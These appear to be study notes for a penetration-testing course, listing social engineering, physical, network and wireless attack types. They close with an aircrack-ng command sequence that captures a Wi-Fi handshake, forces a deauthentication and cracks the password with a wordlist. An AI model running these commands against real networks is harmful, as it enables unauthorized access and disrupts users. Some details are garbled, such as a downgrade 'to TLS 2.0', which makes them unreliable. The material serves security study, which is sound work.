# Attacks and Exploits
## Social Engineering Attacks

### Attack Methods
- Phishing 
  - Email
  - Spear Phishing - to appeal to a specific individual
- Vishing
  - Phone 
- SmSphishing
  - SMS
- Whaling
  - CFO, CEO, CIO 
- Impersonation
- Elicitation
- Shoulder Surfing
- USB Key Drop

### Motivation Factors
- Authority (IRS CALL SCAM)
- Urgency
- Social Proof
- Scarcity
- Likeability
- Fear

### Physical Security Attacks
- Piggybacking/tailgating
- Fence Jumping
- Dumpster Diving
- Lock Picking
- Lock Bypass
- Egress Sensor
- Badge Cloning

## Exploiting Network and Application Vulnerabilities

### Network-based Vulnerabilities
- NETBIOS Name Service
- Link-Local Multicast Name Resolution (LLMNR)
- Server Message Block (SMB) | Linux Samba TCP 139 & 445
- Simple Network Management Protocol (SNMP)
- Simple Mail Transfer Protocol (SMTP)
- File Transfer Protocol | Port 21
- DNS Poisoning - Fake DNS record
- DNS Cache Poisoning
- Pass the hask - NT LAN Manager (NTLM) authentication system
- Man-in-the-middle
  - ARP Spoofing
  - DHCP Spoofing
  - Replay Attack
  - Relay Attack
  - SSL Stripping - tricks with a HTTP instead of HTTPS
  - Downgrade - drop to lower security mode TLS 1.2 down to TLS 2.0 which is less secure
  - Denial of Service
  - Network Access Control (NAC) bypass
  - Virtual Local Area Network (VLAN) hopping - Switch Spoofing

### Wireless-based Vulns
- Evil Twin - Rogue access point (Pineapple)
- Fragmentation attack
- Credential Harvesting
  - ESPortalV2 - fake portal to redirect all WiFi devices connected to the portal for auth.
- WPS implementation weakness - you can brute force it due to the 8 digit WPS Pin 
- Bluetooth attacks
  - Bluejacking - sending unsolicited messages over Bluetooth to Bluetooth-enabled devices such as mobiles
  - Bluesnarfing - Theft of information from a wireless device through a Bluetooth connection
- RFID cloning - RF to copy badge
- Jamming 
- Repeating - wireless repeater, attack vector
- Fake cellphone towers - IMSI capture -> MITM attack
- WiFi Attack 
  - Aircrack-ng
```
# iwconfig
# airmon-ng start wlan0
# iwconfig
# airodump-ng wlan0mon
# airodump-ng wlan0mon -c <AP channel> --bssid <AP MAC> --write <wifiname>
# aireplay-ng --deauth 0 -a <AP MAC> -c <Client MAC> <intfaceCard>
# ls
find .cap file
# aircrak-ng <capture file> -w <wordlist>
```
